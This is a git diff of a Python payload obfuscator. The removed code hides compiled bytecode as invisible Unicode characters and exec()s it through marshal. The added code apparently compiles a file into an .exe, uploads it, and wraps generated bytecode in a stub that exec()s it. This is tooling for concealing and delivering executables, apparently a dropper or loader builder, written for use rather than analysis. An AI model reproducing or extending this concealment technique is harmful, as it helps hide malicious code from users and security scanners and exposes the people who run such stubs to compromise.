@@ -1,21 +1,22 @@
-import py_compile, os
+from create_exe import create_exe
+from create_bytecode import create_bytecode
+from upload import upload
+import os
 
-
-def load_bin(file_path):
-    pyc_path = py_compile.compile(file_path)
-
-    with open(pyc_path, "rb") as f:
-        raw_bin = f.read()
-    os.remove(pyc_path)
-    return raw_bin
+DEBUG = False
 
 def obfuscate(file_path):
-    raw_bin = load_bin(file_path)
-
-    raw_bin = ''.join(format(byte, '08b') for byte in raw_bin).replace("0"," ").replace("1"," ᠍") # https://invisible-characters.com/
-
-    code = f"""import marshal as m
-exec(m.loads(bytes(int("{raw_bin}".replace(" ","0").replace(" ᠍","1")[i:i+8],2)for i in range(0,len("{raw_bin}".replace(" ","0").replace(" ᠍","1")),8))[16:]))
+    if not DEBUG:
+        exe_path = create_exe(file_path)
+    else:
+        exe_path = "meow.exe"
+    bytecode_path = create_bytecode(upload(exe_path))
+    with open(bytecode_path, "rb") as f:
+        raw_bytecode = f.read()
+    # remove the bytecode file
+    os.remove(bytecode_path)
+    code = f"""import sys, marshal as m
+header_size = 16 if sys.version_info >= (3,7) else 8
+exec(m.loads({raw_bytecode}[header_size:]))
 """
     return code
-
